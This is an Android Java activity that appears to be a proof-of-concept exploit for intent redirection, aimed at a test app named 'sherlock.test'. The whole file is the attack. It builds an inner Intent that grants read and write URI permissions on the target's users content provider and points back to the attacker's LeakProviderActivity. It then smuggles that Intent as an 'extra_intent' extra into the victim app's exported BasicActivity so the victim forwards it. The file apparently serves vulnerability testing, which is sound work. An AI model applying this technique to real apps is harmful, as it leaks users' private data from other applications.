package sherlock.poc.intent_redirection;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class BasicActivity extends AppCompatActivity {

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, BasicActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setData(Uri.parse("content://sherlock.test.users_provider/users"));
        target.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        target.setClassName(getPackageName(), getPackageName() + ".intent_redirection.LeakProviderActivity");

        Intent i = new Intent();
        i.setClassName("sherlock.test", "sherlock.test.intent_redirection.BasicActivity");
        i.putExtra("extra_intent", target);
        startActivity(i);
    }
}
